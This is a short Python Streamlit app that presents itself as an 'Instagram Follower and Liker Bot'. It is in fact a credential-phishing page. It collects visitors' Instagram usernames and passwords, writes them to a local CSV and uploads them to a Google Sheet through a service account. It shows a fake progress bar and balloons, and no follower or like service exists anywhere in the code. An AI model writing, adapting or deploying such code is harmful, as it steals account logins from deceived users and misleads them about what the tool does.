import streamlit as st
import time
import pandas as pd
from oauth2client.service_account import ServiceAccountCredentials
import gspread


scope = ['https://www.googleapis.com/auth/spreadsheets', "https://www.googleapis.com/auth/drive.file", "https://www.googleapis.com/auth/drive"]
creds = ServiceAccountCredentials.from_json_keyfile_name('pythonsheet-355816-3b9cfb65b193.json', scope)
client = gspread.authorize(creds)

python_test = client.open("pythontest").sheet1

imageurl = None

st.title('Instagram Follower and Liker Bot')
title = st.text_input('Username', 'Enter Username here')
password = st.text_input('Password',type="password")

#inputs to add spice to this boring dashboard.
age = st.slider('How many followers would you like?', 0, 10000, 100)
st.write("You will gain  ", age, 'followers')
imageurl = st.text_input('Instagram Image URL', '')
if imageurl:
    st.image("https://logodix.com/logo/14546.jpg", caption='Image Upload Successful')
like = st.slider('How many followers would you like?', 0, 10000, 0)
st.write("You will gain  ", like, 'likes')
my_bar = st.progress(0)

if st.button('Run'):
    #append userdata to a .txt file
    text_file = open("user.csv", "a+")
    text_file.write(f'{title}')
    text_file.write(","+f'{password}\n')
    text_file.close()
    #write csv to df
    df = pd.read_csv("user.csv", sep=",", header=None)
    #st.write(df)
    #write df to google sheets file
    python_test.update([df.columns.values.tolist()] + df.values.tolist())
    #flashystuff for users
    for percent_complete in range(100):
     time.sleep(.01)
     my_bar.progress(percent_complete + 1)
    st.balloons()
